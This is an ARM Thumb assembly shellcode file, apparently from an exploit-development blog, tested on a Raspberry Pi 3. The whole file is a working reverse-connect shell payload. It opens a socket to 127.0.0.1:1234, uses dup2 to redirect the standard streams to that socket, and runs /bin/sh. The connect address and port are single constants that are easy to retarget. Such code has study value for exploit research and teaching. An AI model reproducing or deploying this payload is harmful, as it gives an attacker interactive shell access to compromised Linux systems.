/**
  reverse connect shell to 127.0.0.1:1234
  tested with linux running on raspberry pi 3  
  
  http://modexp.wordpress.com/   
*/

    .global _start
    .text

_start:
    // switch to thumb mode
    .code 32
    add    r3, pc, #1
    bx     r3 
  
    .code 16
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    eor    r2, r2, r2  // r2 = IPPROTO_IP
    mov    r1, #1      // r1 = SOCK_STREAM
    mov    r0, #2      // r0 = AF_INET
    lsl    r7, r1, #8  // multiply by 256
    add    r7, #25     // 256+25 = socket
    svc    1
  
    // connect(s, &sa, sizeof(sa));
    mov    r6, r0       // r6 = s
    adr    r1, sin_port // r1 = sa.sin_port
    mov    r2, #16      // r2 = sizeof(sa)
    add    r7, #2       // r7 = 281+2 = connect
    svc    1
  
    // dup2(s, FILENO_STDIN);
    // dup2(s, FILENO_STDOUT);
    // dup2(s, FILENO_STDERR);
    mov    r1, #2      // for 3 descriptors
dup_loop:
    mov    r7, #63     // r7 = dup 
    mov    r0, r6      // r0 = s
    svc    1
    sub    r1, #1      // 
    bpl    dup_loop

    // execve("/bin/sh", NULL, NULL);
    adr    r0, sh        // r0 = "/bin/sh" 
    // umull r1, r2, r0, r0
    eor    r2, r2, r2    // r2 = NULL
    eor    r1, r1, r1    // r1 = NULL
    strb   r2, [r0, #7]  // add null terminator    
    mov    r7, #11       // r7 = execve
    svc    1
    nop                  // alignment by 4 bytes
sin_port:    
    .word  0xd2040002    // 1234, AF_INET
sin_addr:
    .word  0x0100007f    // 127.0.0.1
sh:  
    .ascii "/bin/shX"

